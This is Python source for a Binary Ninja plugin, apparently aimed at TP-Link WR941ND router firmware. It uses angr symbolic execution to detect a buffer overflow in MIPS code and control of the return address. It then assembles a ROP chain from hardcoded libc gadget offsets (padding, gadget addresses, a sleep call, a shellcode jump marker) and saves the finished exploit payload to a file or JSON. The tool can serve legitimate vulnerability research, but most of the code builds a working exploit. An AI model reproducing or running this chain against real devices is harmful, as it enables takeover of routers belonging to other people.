import angr
import string
import claripy
import archinfo
import tempfile
import sys
from binaryninja.highlight import HighlightColor
from binaryninja.enums import HighlightStandardColor, MessageBoxButtonSet, MessageBoxIcon
from binaryninja.plugin import PluginCommand, BackgroundTaskThread, BackgroundTask
import binaryninja.interaction as interaction
from binaryninja.interaction import get_save_filename_input, show_message_box
import binaryninja as binja
from binaryninja import BinaryView, SectionSemantics
from abc import ABC, abstractmethod
import os
import json
import collections
import binascii
from pwn import *

registers = {"mips32": ['a0', 'a1', 'a2', 'a3', 's0', 's1',
             's2', 's3', 's4', 's5', 's6', 's7',
             't0', 't1', 't2', 't3', 't4', 't5',
             't6', 't7', 't8', 't9', 'v0', 'v1',
             'sp', 'gp', 'pc', 'ra', 'fp'],
             "armv7": ['r0', 'r1', 'r2', 'r3', 'r4', 'r5',
             'r6', 'r7', 'r8', 'r9', 'r10', 'r11',
             'r12', 'lr', 'sp', 'pc']}


class Explorer(ABC):
    @abstractmethod
    def run(self):
        pass

    @abstractmethod
    def explore(self):
        pass


class MainExplorer(Explorer):

    @abstractmethod
    def explore(self):
        pass

    @abstractmethod
    def feed_function_state(self):
        pass

    @abstractmethod
    def set_args(self):
        pass

    @abstractmethod
    def set_sim_manager(self):
        pass


class UIPlugin(PluginCommand):

    path = []

    def __init__(self):
        super(UIPlugin, self).register_for_address("Explorer\WR941ND\Start Address\Set",
              "Set execution starting point address", self.set_start_address)
        super(UIPlugin, self).register("Explorer\WR941ND\Start Address\Clear",
              "Clear starting point address", self.clear_start_address)
        super(UIPlugin, self).register_for_address(
            "Explorer\WR941ND\End Address\Set", "Set execution end address", self.set_end_address)
        super(UIPlugin, self).register("Explorer\WR941ND\End Address\Clear",
              "Clear end point address", self.clear_end_address)
        super(UIPlugin, self).register("Explorer\WR941ND\ROP\Shared Library\Select",
                       "Try to build exploit rop chain", self.choice_menu)
        super(UIPlugin, self).register(
            "Explorer\WR941ND\Library\Set Library Path", "Add LD_PATH", self.set_ld_path)
        super(UIPlugin, self).register_for_address(
            "Explorer\WR941ND\Function\Set Params","Add function params", self.set_function_params)
        super(UIPlugin, self).register(
            "Explorer\WR941ND\Clear All", "Clear data", self.clear)

        self.start = None
        self.end = None

    def set_ld_path(self, bv):
        path = interaction.get_directory_name_input("Select LD_PATH")
        if(not path):
            return
        binja.log_info("Selected LD_PATH: {0}".format(path))
        BackgroundTaskManager.ld_path = path.decode()

    def choice_menu(self, bv):
        try:
            proj = angr.Project(bv.file.filename, ld_path=[
                                BackgroundTaskManager.ld_path], use_system_libs=False)
            libs = list(proj.loader.shared_objects.keys())[1::]
            mapped_libs = {}
            for i in range(0, len(libs)):
                mapped_libs[i] = libs[i]
            selected = interaction.get_choice_input(
                "Libraries", "project libraries", libs)
            binja.log_info("Selected library {0}".format(
                mapped_libs[selected]))
            BackgroundTaskManager.selected_opt =  mapped_libs[selected]
        except KeyError:
            UIPlugin.display_message(
                'KeyException', "Library was not selected")

    @classmethod
    def dump_regs(self, state, registers, *include):
        data = []
        if(len(include) > 0):
            data = [x for x in registers if x in include]
        else:
            data = registers
        for reg in data:
            binja.log_info("${0}: {1}".format(reg, state.regs.get(reg)))

    @classmethod
    def color_path(self, bv, addr):
        # Highlight the instruction in green
        blocks = bv.get_basic_blocks_at(addr)
        UIPlugin.path.append(addr)
        for block in blocks:
            block.set_auto_highlight(HighlightColor(
                HighlightStandardColor.GreenHighlightColor, alpha=128))
            block.function.set_auto_instr_highlight(
                addr, HighlightStandardColor.GreenHighlightColor)

    @classmethod
    def clear_color_path(self, bv):
        if(len(UIPlugin.path) <= 0):
            UIPlugin.display_message("Path", "Nothing to clear yet")
            return
        for addr in UIPlugin.path:
            blocks = bv.get_basic_blocks_at(addr)
            for block in blocks:
                block.set_auto_highlight(HighlightColor(
                    HighlightStandardColor.NoHighlightColor, alpha=128))
                block.function.set_auto_instr_highlight(
                    addr, HighlightStandardColor.NoHighlightColor)

    def set_start_address(self, bv, addr):
        try:
            blocks = bv.get_basic_blocks_at(addr)
            for block in blocks:
                if(addr != self.start and self.start != None):
                    block.function.set_auto_instr_highlight(
                        self.start, HighlightStandardColor.NoHighlightColor)
                    block.function.set_auto_instr_highlight(
                        addr, HighlightStandardColor.OrangeHighlightColor)
                    self.start = addr
                    BackgroundTaskManager.start_addr = self.start
                else:
                    block.function.set_auto_instr_highlight(
                        addr, HighlightStandardColor.OrangeHighlightColor)
                    self.start = addr
                    BackgroundTaskManager.start_addr = self.start
            binja.log_info("Start: 0x%x" % addr)
        except:
            show_message_box("StartAddress", "Error please open git issue !",
                             MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.ErrorIcon)

    def _clear_address(self, block, addr):
        for x in block:
            x.function.set_auto_instr_highlight(
                addr, HighlightStandardColor.NoHighlightColor)
        addr = None

    def clear_start_address(self, bv):
        if self.start:
            start_block = bv.get_basic_blocks_at(self.start)
            self._clear_address(start_block, self.start)
            self.start = None
            BackgroundTaskManager.start_addr = self.start
        else:
            show_message_box("Plugin", "Start address not set !",
                                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
            return

    def set_end_address(self, bv, addr):
        try:
            blocks = bv.get_basic_blocks_at(addr)
            for block in blocks:
                if(addr != self.end and self.end != None):
                    block.function.set_auto_instr_highlight(
                        self.end, HighlightStandardColor.NoHighlightColor)
                    block.function.set_auto_instr_highlight(
                        addr, HighlightStandardColor.OrangeHighlightColor)
                    self.end = addr
                    BackgroundTaskManager.end_addr = self.end
                    bv.set_default_session_data('end_addr', self.end)
                else:
                    block.function.set_auto_instr_highlight(
                        addr, HighlightStandardColor.OrangeHighlightColor)
                    self.end = addr
                    BackgroundTaskManager.end_addr = self.end
                    bv.set_default_session_data('end_addr', self.end)
            binja.log_info("End: 0x%x" % addr)
        except:
            show_message_box("Plugin", "Error please open git issue !",
                                MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.ErrorIcon)

    def clear_end_address(self, bv):
        if self.end:
            end_block = bv.get_basic_blocks_at(self.end)
            self._clear_address(end_block, self.end)
            self.end = None
            BackgroundTaskManager.end_addr = self.end
        else:
            show_message_box("Plugin", "End address not set !",
                                            MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)
            return

    @classmethod
    def display_message(self, title, desc):
          show_message_box(title, desc,
                                MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.WarningIcon)

    def generate_menu_text_fields(self, size):
        menu = ["Function Params"]
        for i in range(0, size):
             text_field = interaction.TextLineField("Param {0}".format(i))
             choice_pointer = interaction.ChoiceField("Pointer", ["No", "Yes"])
             overflow_field = interaction.ChoiceField("Buffer Overflow", ["No", "Yes"])
             menu.append(text_field)
             menu.append(choice_pointer)
             menu.append(overflow_field)
        return menu

    def get_menu_results(self, menu_items, param_num):
        result = [x.result for x in menu_items]
        return [result[i*param_num:(i+1)*param_num] for i in range(len(result)//param_num)]
        
    def convert_menu_results(self, results):
        keys = ['param', 'pointer', 'b_overflow']
        converted_list = []
        for item in results:
            converted_list.append({keys[i]: item[i] for i in range(len(keys))})
        return converted_list

     
    def set_function_params(self, bv, addr):
        func = bv.get_function_at(addr)
        if(func == None or type(func) != binja.function.Function):
            self.display_message("Error", "This is not a function!" )
            return
        binja.log_info("Function has {0} params".format(len(func.parameter_vars)))
        menu_items = self.generate_menu_text_fields(len(func.parameter_vars))
        menu = interaction.get_form_input(menu_items, "Parameters")
        if menu:
            results = self.get_menu_results(menu_items[1::], 3)
            converted = self.convert_menu_results(results)
            print("Converted params", converted)
            BackgroundTaskManager.func_params = converted
    
    @classmethod
    def clear(self, bv):
        UIPlugin.clear_color_path(bv)
        BackgroundTaskManager.start_addr = 0x0
        BackgroundTaskManager.end_addr = 0x0
        BackgroundTaskManager.func_params = {}
        BackgroundTaskManager.selected_opt = ''
        BackgroundTaskManager.ld_path = ''
        
class AngrRunner(BackgroundTaskThread):
    def __init__(self, bv, explorer):
        BackgroundTaskThread.__init__(
            self, "Vulnerability research with angr started...", can_cancel=True)
        self.bv = bv
        self.explorer = explorer

    def run(self):
        self.explorer.run()

    @classmethod
    def cancel(self, bv):
        UIPlugin.clear_color_path(bv)


class BackgroundTaskManager():
    start_addr = 0x0
    end_addr = 0x0
    ld_path = ''
    func_params = {}
    selected_opt = ''

    def __init__(self, bv):
        self.runner = None
        self.vulnerability_explorer = None
        self.rop_explorer = None
        self.exploit_creator = None
        self.proj = None
        self.init = None
        self.libc_base = None
        self.payload = ''

    @classmethod
    def set_exploit_payload(self, init, payload):
        self.payload = payload
        self.init = init

    @classmethod
    def vuln_explore(self, bv):
        try:
            start_addr = BackgroundTaskManager.start_addr
            end_addr = BackgroundTaskManager.end_addr
            ld_path = BackgroundTaskManager.ld_path
            params = BackgroundTaskManager.func_params
            if(start_addr == 0x0 or end_addr == 0x0):
                UIPlugin.display_message(
                  'TypeError', "Invalid or missing start_addr or end_addr")
                return
            print("BackgroundTaskManager start_addr: 0x{0:0x}, end_addr: 0x{1:0x}".format(start_addr, end_addr))
            self.vulnerability_explorer = VulnerabilityExplorer(
                bv, BackgroundTaskManager.start_addr, BackgroundTaskManager.end_addr, ld_path=ld_path)
            binja.log_info("Session function params {0}".format(params))
            args = self.vulnerability_explorer.set_args(params)
            binja.log_info("Parameters pass to function {0}".format(args))
            state = self.vulnerability_explorer.feed_function_state(args)
            self.vulnerability_explorer.set_sim_manager(state)
            self.vulnerability_explorer.check_buffer_overflow(params)
            self.runner = AngrRunner(bv, self.vulnerability_explorer)
            self.runner.start()
        except KeyError as e:
              UIPlugin.display_message(
                  'KeyError', "Missing definition of: {0}".format(e))
              return

    @classmethod
    def build_rop(self, bv):
        try:
            start_addr = BackgroundTaskManager.start_addr
            end_addr = BackgroundTaskManager.end_addr
            ld_path = BackgroundTaskManager.ld_path
            if(start_addr == 0x0 or end_addr == 0x0 or ld_path == ''):
                UIPlugin.display_message(
                  'TypeError', "Invalid or missing start_addr or end_addr or lib path")
                return
            print("BackrgoundTaskManager ld_path: {0}".format(ld_path))
            selected_opt = BackgroundTaskManager.selected_opt
            self.proj = angr.Project(bv.file.filename, ld_path=[
                ld_path], use_system_libs=False)
            self.libc = self.proj.loader.shared_objects[selected_opt]
            print("LIBC", self.libc)
            self.libc_base = self.libc.min_addr
            self.gadget1 = self.libc_base+0x00055c60
            self.gadget2 = self.libc_base+0x00024ecc
            self.gadget3 = self.libc_base+0x0001e20c
            self.gadget4 = self.libc_base+0x000195f4
            self.gadget5 = self.libc_base+0x000154d8
            self.sleep = self.libc_base + 0x00053ca0

            self.init = b"A"*160 + b"BBBB" + \
                p32(self.gadget2, endian='big')+p32(self.gadget1, endian='big')
            self.rop_explorer = ROPExplorer(bv, self.proj, start_addr, end_addr, first=self.gadget1, second=self.gadget2,
                                            third=self.gadget3, fourth=self.gadget4, fifth=self.gadget5, sixth=self.sleep)

            args = self.rop_explorer.set_args(
                arg0={'key': self.init, 'key_type': 'pointer'})
            state = self.rop_explorer.feed_function_state(args)
            self.rop_explorer.set_sim_manager(state)
            self.runner = AngrRunner(bv, self.rop_explorer)
            self.runner.start()
        except KeyError as e:
            UIPlugin.display_message(
                'KeyException', "Missing definition of: {0}".format(str(e)))

    @classmethod
    def exploit_to_file(self, bv):
        self.exploit_creator = FileExploitCreator(bv, self.init, self.payload)
        self.runner = AngrRunner(bv, self.exploit_creator)
        self.runner.start()

    @classmethod
    def exploit_to_json(self, bv):
        self.json_exploit_creator = JSONExploitCreator(
            bv, self.init, self.payload)
        self.runner = AngrRunner(bv, self.json_exploit_creator)
        self.runner.start()

    @classmethod
    def stop(self, bv):
        self.runner.cancel(bv)

       
class VulnerabilityExplorer(MainExplorer):
    def __init__(self, bv, func_start_addr, func_end_addr, ld_path=None, use_system_libs=False):
        self.bv = bv
        self.func_start_addr = func_start_addr
        self.func_end_addr = func_end_addr
        self.proj = angr.Project(self.bv.file.filename, ld_path=[
            ld_path], use_system_libs=use_system_libs)
        self.cfg = self.proj.analyses.CFGFast(
            regions=[(self.func_start_addr, self.func_end_addr)])
        self.args = {}
        self.overflow = False
        self.params = None

        self.proj.hook(self.func_end_addr, self.explore)

    def explore(self, state):
        UIPlugin.color_path(self.bv, state.solver.eval(
            state.regs.pc, cast_to=int))
        if state.solver.eval(state.regs.pc, cast_to=int) == self.func_end_addr:
            UIPlugin.dump_regs(state, registers[self.bv.arch.name])
            return True

    def run(self):
        sm = self.simgr.explore(find=self.explore)
        test = sm.found
        if len(test) > 0:
            print(sm.found)
            found = sm.found[0]
            print("found", found)
            if self.overflow:
                self.identify_overflow(found, registers[self.bv.arch.name])

    def set_args(self, args):
        counter = 0
        if args is not None:
            for item in args:
                if item['pointer'] == 1:
                    self.args['arg'+str(counter)] = angr.PointerWrapper(item.get('param'))
                else:
                    self.args['arg'+str(counter)] = item.get('param')
                counter +=1
        return self.args

    def feed_function_state(self, args=None, data=None):
        self.state = self.proj.factory.call_state(self.func_start_addr, args['arg0'])
        return self.state
    
    def set_sim_manager(self, state):
         self.simgr = self.proj.factory.simgr(self.state)

    def check_buffer_overflow(self, params):
        if params:
            self.params = params
        counter = 0
        for item in params:
            if item['b_overflow'] == 1:
                counter +=1
        if counter == 1:
            self.overflow = True
            return self.overflow
        elif counter > 1:
            UIPlugin.display_message('Buffer Overflow Check', "Only one parameter could be check for Buffer Overflow")
            self.overflow = False 
            return self.overflow
        else:
            self.overflow = False 
            return self.overflow
    
    def find_pattern(self, params, pattern):
        for item in params:
            dest = item.get('param').encode()
            if pattern in dest:
                return True
        return False

    def identify_overflow(self, found, registers=[], silence=True, *exclude):
        data = []
        report = {}
        if(len(exclude) > 0):
            data = [x for x in registers if x not in exclude]
        else:
            data = registers
        for arg in data:
            pattern = found.solver.eval(found.regs.get(arg), cast_to=bytes)
            if self.find_pattern(self.params, pattern):
                if(arg == 'ra' and cyclic_find(pattern.decode())):
                    binja.log_warn("[*] Buffer overflow detected !!!")
                    binja.log_warn(
                        "[*] We can control ${0} after {1} bytes !!!!".format(arg, cyclic_find(pattern.decode())))
                    report[arg] = cyclic_find(pattern.decode())
                else:
                    binja.log_warn(
                        "[+] Register ${0} overwritten after: {1} bytes".format(arg, cyclic_find(pattern.decode())))
                    report[arg] = cyclic_find(pattern.decode())
            else:
                if(not silence):
                    binja.log_info(
                        "[-] Register ${0} not overwrite by pattern".format(arg))
        if(bool(report)):
            interaction.show_markdown_report(
                "Vulnerability Info Report", self.get_vuln_report(report))

    def get_vuln_report(self, report):
        contents = "==== Vulnerability Report ====\r\n\n"
        for key, value in report.items():
            if(key == 'ra'):
                contents += "[*] Buffer overflow detected !!!\r\n\n"
                contents += "We can control ${0} after {1} bytes !!!!\r\n\n".format(
                    key, value)
            else:
                contents += "Register ${0} overwritten after {1} bytes !!!!\r\n\n".format(
                    key, value)
        return contents


class ROPExplorer(MainExplorer):
    def __init__(self, bv, project, func_start_addr, func_end_addr, **kwargs):
        self.bv = bv
        self.func_start_addr = func_start_addr
        self.func_end_addr = func_end_addr
        self.proj = project
        self.proj.analyses.CFGFast(regions=[(self.func_start_addr, self.func_end_addr)])
        self.init = None
        self.args={}
        self.gadget1 = kwargs['first']
        self.gadget2 = kwargs['second']
        self.gadget3 = kwargs['third']
        self.gadget4 = kwargs['fourth']
        self.gadget5 = kwargs['fifth']
        self.sleep = kwargs['sixth']
        self.state_history = collections.OrderedDict()
        self.payload = collections.OrderedDict()
    
        binja.log_info("Gadget 1 address: 0x{0:0x}".format(self.gadget1))
        binja.log_info("Gadget 2 address: 0x{0:0x}".format(self.gadget2))
        binja.log_info("Gadget 3 address: 0x{0:0x}".format(self.gadget3))
        binja.log_info("Sleep func address: 0x{0:0x}".format(self.sleep))
        binja.log_info("Gadget 4 address: 0x{0:0x}".format(self.gadget4))
        binja.log_info("Gadget 5 address: 0x{0:0x}".format(self.gadget5))

        self.proj.hook(self.func_end_addr, self.overwrite_ra)
        self.proj.hook(self.gadget1, self.hook_gadget1)
        self.proj.hook(self.gadget2, self.hook_gadget2)  # jalr $t9
        # lw $s1, 0x28($sp)
        self.proj.hook(self.gadget2+4, self.hook_gadget2next4)
        # lw $s0, 0x24($sp)
        self.proj.hook(self.gadget2+8, self.hook_gadget2next8)
        self.proj.hook(self.gadget3, self.hook_gadget3)  # mov $t9, $s1
        # lw $ra, 0x24($sp)
        self.proj.hook(self.gadget3+4, self.hook_gadget3next4)
        # lw $s2, 0x20($sp)
        self.proj.hook(self.gadget3+8, self.hook_gadget3next8)
        # lw $s1, 0x1c($sp)
        self.proj.hook(self.gadget3+12, self.hook_gadget3next12)
        # lw $s0, 0x18($sp)
        self.proj.hook(self.gadget3+16, self.hook_gadget3next16)
        self.proj.hook(self.gadget4, self.hook_gadget4)  # addiu $s0, $sp, 0x24
        self.proj.hook(self.gadget5+4, self.explore)  # jalr $
        
    def set_args(self, **args):
        if args is not None:
            for key, value in args.items():
                if(type(value) == dict):
                    key_type = value.get('key_type')
                    if key_type == 'pointer':
                        self.args[key] = angr.PointerWrapper(value.get('key'))
                else:
                    self.args[key] = value
        return self.args

    def feed_function_state(self, args=None, data=None):
        self.state = self.proj.factory.call_state(self.func_start_addr, args['arg0'])
        return self.state
    
    def set_sim_manager(self, state):
         self.simgr = self.proj.factory.simgr(self.state)
    
    def get_rop_report(self, state, data, gadget):
        contents = "==== 0x{0:0x} Registers ====\r\n\n".format(gadget)
        for reg in data:
            contents += "${0}: 0x{1:0x}\r\n\n".format(
                reg, state.solver.eval(state.regs.get(reg), cast_to=int))
        return contents

    def get_stack_report(self, data):
        contents = "====Stack Data ====\r\n\n"
        for key, value in data.items():
            contents += "{0}: {1}\r\n\n".format(key.decode(),hex(u32(value, endian='big')))
        return contents

    def stack_adjust(self, state, reg, size, data="EEEE", vector_size=32):
        if(size >= 0):
            for i in range(4, size+4, 4):
                state.memory.store(reg+i, state.solver.BVV(data, 32))
                self.payload[hex(reg+i).encode()] = data.encode()

    def overwrite_ra(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        UIPlugin.color_path(self.bv, pc)
        if pc == self.func_end_addr:
            self.state_history['init'] = state

    def hook_gadget1(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget1:
            self.state_history[hex(self.gadget1)] = state

    def hook_gadget2(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget2:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            self.stack_adjust(state, sp, 0x20, "EEEE")
            # lw $ra, 0x2c($sp)
            state.memory.store(sp+0x2c, state.solver.BVV(self.gadget3, 32))
            self.payload[hex(sp+0x2c).encode()] = p32(self.gadget3, endian='big')
            self.state_history[hex(self.gadget2)] = state

    def hook_gadget2next4(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget2+4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s1, 0x28($sp)
            state.memory.store(sp+0x28, state.solver.BVV(self.sleep, 32))
            self.payload[hex(sp+0x28).encode()] = p32(self.sleep, endian='big')

    def hook_gadget2next8(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget2+8:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s0, 0x24($sp)
            state.memory.store(sp+0x24, state.solver.BVV("DDDD", 32))
            self.payload[hex(sp+0x24).encode()] = b'DDDD'

    def hook_gadget3(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            self.stack_adjust(state, sp, 0x18, "GGGG")
            # gadget3 -> lw $s0, 0x18($sp) => 24 bytes
            self.state_history[hex(self.gadget3)] = state

    def hook_gadget3next4(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $ra, 0x24($sp)
            state.memory.store(sp+0x24, state.solver.BVV(self.gadget4, 32))
            self.payload[hex(sp+0x24).encode()] = p32(self.gadget4, endian='big')

    def hook_gadget3next8(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+8:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s2, 0x20($sp)
            state.memory.store(sp+0x20, state.solver.BVV("CCCC", 32))
            self.payload[hex(sp+0x20).encode()] = b'CCCC'

    def hook_gadget3next12(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+12:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s1, 0x1c($sp)
            state.memory.store(sp+0x1c, state.solver.BVV(self.gadget5, 32))
            self.payload[hex(sp+0x1c).encode()] = p32(self.gadget5, endian='big')

    def hook_gadget3next16(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget3+16:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # lw $s0, 0x18($sp)
            state.memory.store(sp+0x18, state.solver.BVV("FFFF", 32))
            self.payload[hex(sp+0x18).encode()] = b'FFFF'

    def hook_gadget4(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget4:
            sp = state.solver.eval(state.regs.sp, cast_to=int)
            # addiu $s0, $sp, 0x24
            state.memory.store(sp+0x24, state.solver.BVV("SHEL", 32))
            self.payload[hex(sp+0x24).encode()] = b'SHEL'
            self.state_history[hex(self.gadget4)] = state

    def explore(self, state):
        pc = state.solver.eval(state.regs.pc, cast_to=int)
        if pc == self.gadget5+4:
            return True

    def run(self):
        sm = self.simgr.explore(find=self.explore)
        test = sm.found
        if len(test) > 0:
            print(sm.found)
            found = sm.found[0]
            print("found", found)
            UIPlugin.dump_regs(found, registers[self.bv.arch.name])

        # Generate raport for gadgets

            interaction.show_markdown_report("Initial State", self.get_rop_report(
                self.state_history['init'], registers[self.bv.arch.name], self.func_end_addr))
            interaction.show_markdown_report("ROP Gadget 1", self.get_rop_report(
                self.state_history[hex(self.gadget1)], registers[self.bv.arch.name], self.gadget1))
            interaction.show_markdown_report("ROP Gadget 2", self.get_rop_report(
                self.state_history[hex(self.gadget2)], registers[self.bv.arch.name], self.gadget2))
            interaction.show_markdown_report("ROP Gadget 3", self.get_rop_report(
                self.state_history[hex(self.gadget3)], registers[self.bv.arch.name], self.gadget3))
            interaction.show_markdown_report("ROP Gadget 4", self.get_rop_report(
                self.state_history[hex(self.gadget4)], registers[self.bv.arch.name], self.gadget4))
            interaction.show_markdown_report("ROP Gadget 5", self.get_rop_report(
                found, registers[self.bv.arch.name], found.solver.eval(found.regs.pc, cast_to=int)))
            self.state_history[hex(self.gadget5)] = found

            sortedDict = collections.OrderedDict(sorted(self.payload.items()))
            print("Payload", sortedDict)
            interaction.show_markdown_report(
                'ROP Stack', self.get_stack_report(sortedDict))
            BackgroundTaskManager.set_exploit_payload(self.init, sortedDict)


class FileExploitCreator(Explorer):
    def __init__(self, bv, init, payload):
        self.bv = bv
        self.init = init
        self.payload = payload

    def explore(self):
        pass

    def generate_exploit(self, payload):
        exploit = self.init
        for key, value in payload.items():
            exploit += value
        return exploit

    def run(self):
        exploit = self.generate_exploit(self.payload)
        prompt_file = get_save_filename_input('filename')
        if(not prompt_file):
            return
        print("exploit", exploit)
        file_exploit = open(prompt_file, 'wb')
        file_exploit.write(exploit)
        file_exploit.close()
        show_message_box("Exploit Creator", "Exploit saved to file",
                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)


class JSONExploitCreator(Explorer):
    def __init__(self, bv, init, payload):
        self.bv = bv
        self.init = init
        self.payload = payload

    def explore(self):
        pass

    def decode_from_bytes(self,data):
        decoded_dict = collections.OrderedDict()
        for k,v in data.items():
            decoded_dict[k.decode()] = u32(v)
        return decoded_dict

    def run(self):
        ordered_dict = self.decode_from_bytes(self.payload)
        ordered_dict['junk'] = binascii.hexlify(self.init[0:164]).decode()
        ordered_dict['second'] = u32(self.init[164:168])
        ordered_dict['first'] = u32(self.init[168:172])
        # self.payload['init']=self.init
        data = json.dumps(ordered_dict, ensure_ascii=False, indent=4)
        prompt_file = get_save_filename_input('filename', 'json')
        if(not prompt_file):
            return
        output_file = open(prompt_file.decode("utf-8")+'.json', 'w')
        output_file.write(data)
        output_file.close()
        show_message_box("Exploit Creator", "Exploit saved as JSON",
                         MessageBoxButtonSet.OKButtonSet, MessageBoxIcon.InformationIcon)


PluginCommand.register(
    "Explorer\WR941ND\Explore", "Attempt to solve for a path that satisfies the constraints given", BackgroundTaskManager.vuln_explore)
PluginCommand.register("Explorer\WR941ND\ROP\Build",
                       "Try to build exploit rop chain", BackgroundTaskManager.build_rop)
PluginCommand.register("Explorer\WR941ND\Generate Exploit\Save as JSON",
                       "Try to save exploit as JSON", BackgroundTaskManager.exploit_to_json)
PluginCommand.register("Explorer\WR941ND\Generate Exploit\Save to File",
                       "Try to build exploit fom rop chain", BackgroundTaskManager.exploit_to_file)
if __name__ == "__main__":
    pass
else:
    afl_ui = UIPlugin()
